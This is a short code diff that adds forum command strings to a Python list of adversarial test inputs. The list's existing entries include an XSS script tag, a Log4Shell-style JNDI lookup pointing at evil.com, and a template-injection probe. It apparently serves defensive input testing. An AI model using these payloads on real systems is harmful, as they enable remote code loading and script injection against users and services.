@@ -66,6 +66,10 @@ ADVERSARIAL_STRINGS = [
     "<script>alert('xss')</script>",
     "${jndi:ldap://evil.com/a}",
     "{{7*7}}",
+    "forum top",
+    "forum vote TOPIC-00001 up",
+    "forum agents",
+    "forum thread TOPIC-99999",
 ]
 
 
